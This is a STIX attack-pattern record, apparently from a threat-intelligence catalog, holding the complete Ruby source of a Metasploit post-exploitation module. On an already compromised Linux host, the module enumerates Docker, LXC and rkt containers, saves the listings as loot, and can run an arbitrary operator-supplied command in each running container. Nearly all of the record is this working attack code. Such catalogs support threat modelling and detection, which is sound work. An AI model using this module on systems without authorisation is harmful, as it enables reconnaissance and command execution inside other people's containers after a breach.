{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e37c783a-0d5d-452a-9bbb-8e8229a1cb5b",
    "created": "2024-08-14T16:33:17.299236Z",
    "modified": "2024-08-14T16:33:17.29924Z",
    "name": "Linux Container Enumeration",
    "description": " This module attempts to enumerate containers on the target machine and optionally run a command on each active container found. Currently it supports Docker, LXC and RKT.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/linux/gather/enum_containers.rb",
            "external_id": "enum_containers.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linux Container Enumeration',\n        'Description' => %q{\n          This module attempts to enumerate containers on the target machine and optionally run a command on each active container found.\n          Currently it supports Docker, LXC and RKT.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['stealthcopter'],\n        'Platform' => ['linux'],\n        'SessionTypes' => ['shell', 'meterpreter'],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('CMD', [false, 'Optional command to run on each running container', ''])\n      ]\n    )\n  end\n\n  def cmd\n    datastore['CMD']\n  end\n\n  # Check if a container program is installed and usable by current user\n  def runnable(container_type)\n    case container_type\n    when 'docker'\n      command = 'docker >/dev/null 2>&1 && echo true'\n    when 'lxc'\n      command = 'lxc >/dev/null 2>&1 && echo true'\n    when 'rkt'\n      # Apparently rkt doesn't play nice with 2>&1 for most commands, though `rkt help`\n      # seems to be fine so this is why its used here vs just 'rkt'\n      command = 'rkt help >/dev/null 2>&1 && echo true'\n    else\n      print_error(\"Invalid container type #{container_type}\")\n      return false\n    end\n    cmd_exec(command) =~ /true$/\n  end\n\n  # Count the number of currently running containers\n  def count_containers(container_type, count_inactive: true)\n    case container_type\n    when 'docker'\n      command = if count_inactive\n                  'docker container ls --format \"{{.Names}}\" | wc -l'\n                else\n                  'docker container ls -a --format \"{{.Names}}\" | wc -l'\n                end\n    when 'lxc'\n      command = if count_inactive\n                  'lxc list -c n --format csv | wc -l'\n                else\n                  'lxc list -c n,s --format csv | grep ,RUNNING | wc -l'\n                end\n    when 'rkt'\n      command = if count_inactive\n                  'rkt list | tail -n +2 | wc -l'\n                else\n                  'rkt list | tail -n +2 | grep running | wc -l'\n                end\n    else\n      print_error(\"Invalid container type '#{container_type}'\")\n      return 0\n    end\n\n    result = cmd_exec(command)\n    if result =~ /denied/\n      print_error(\"Was unable to enumerate the number of #{container_type} containers due to a lack of permissions!\")\n      return 0\n    else\n      result.to_i\n    end\n  end\n\n  # List containers\n  def list_containers(container_type)\n    case container_type\n    when 'docker'\n      result = cmd_exec('docker container ls -a')\n    when 'lxc'\n      # LXC does some awful table formatting, lets try and fix it to be more uniform\n      result = cmd_exec('lxc list').each_line.reject { |st| st =~ /^\\+--/ }.map.with_index.map do |s, i|\n        if i == 0\n          s.split('| ').map { |t| t.strip.ljust(t.size, ' ').gsub(/\\|/, '') }.join + \"\\n\"\n        else\n          s.gsub(/\\| /, '').gsub(/\\|/, '')\n        end\n      end.join.strip\n    when 'rkt'\n      result = cmd_exec('rkt list')\n    else\n      print_error(\"Invalid container type '#{container_type}'\")\n      return nil\n    end\n    result\n  end\n\n  # List running containers identifiers\n  def list_running_containers_id(container_type)\n    case container_type\n    when 'docker'\n      command = 'docker container ls --format \"{{.Names}}\"'\n    when 'lxc'\n      command = 'lxc list -c n,s --format csv 2>/dev/null | grep ,RUNNING|cut -d, -f1'\n    when 'rkt'\n      command = 'rkt list | tail -n +2 | cut -f1'\n    else\n      print_error(\"Invalid container type '#{container_type}'\")\n      return nil\n    end\n    cmd_exec(command).each_line.map(&:strip)\n  end\n\n  # Execute a command on a container\n  def container_execute(container_type, container_identifier, command)\n    case container_type\n    when 'docker'\n      command = \"docker exec '#{container_identifier}' #{command}\"\n    when 'lxc'\n      command = \"lxc exec '#{container_identifier}' -- #{command}\"\n    when 'rkt'\n      print_error(\"RKT containers do not support command execution\\nUse the command \\\"rkt enter '#{container_identifier}'\\\" to manually enumerate this container\")\n      return nil\n    else\n      print_error(\"Invalid container type '#{container_type}'\")\n      return nil\n    end\n    vprint_status(\"Running #{command}\")\n    cmd_exec(command)\n  end\n\n  # Run Method for when run command is issued\n  def run\n    platforms = %w[docker lxc rkt].select { |p| runnable(p) }\n\n    if platforms.empty?\n      print_error('No container software appears to be installed or runnable by the current user')\n      return\n    end\n\n    platforms.each do |platform|\n      print_good(\"#{platform} was found on the system!\")\n      num_containers = count_containers(platform, count_inactive: false)\n\n      if num_containers == 0\n        print_error(\"No active or inactive containers were found for #{platform}\\n\")\n      else\n        num_running_containers = count_containers(platform, count_inactive: true)\n        print_good(\"#{platform}: #{num_running_containers} Running Containers / #{num_containers} Total\")\n      end\n\n      next unless num_containers > 0\n\n      containers = list_containers(platform)\n      next if containers.nil?\n\n      # Using print so not to mess up table formatting\n      print_line(containers.to_s)\n\n      p = store_loot(\"host.#{platform}_containers\", 'text/plain', session, containers, \"#{platform}_containers.txt\", \"#{platform} Containers\")\n      print_good(\"Results stored in: #{p}\\n\")\n\n      next if cmd.blank?\n\n      running_container_ids = list_running_containers_id(platform)\n      next if running_container_ids.nil?\n\n      running_container_ids.each do |container_id|\n        print_status(\"Executing command on #{platform} container #{container_id}\")\n        command_result = container_execute(platform, container_id, cmd)\n        next if command_result.nil?\n\n        print_good(command_result)\n        p = store_loot(\"host.#{platform}_command_results\", 'text/plain', session, command_result, \"#{platform}_containers_command_results.txt\", \"#{platform} Containers Command Results\")\n        print_good(\"Command execution results stored in: #{p}\\n\")\n      end\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "['linux']"
    ]
}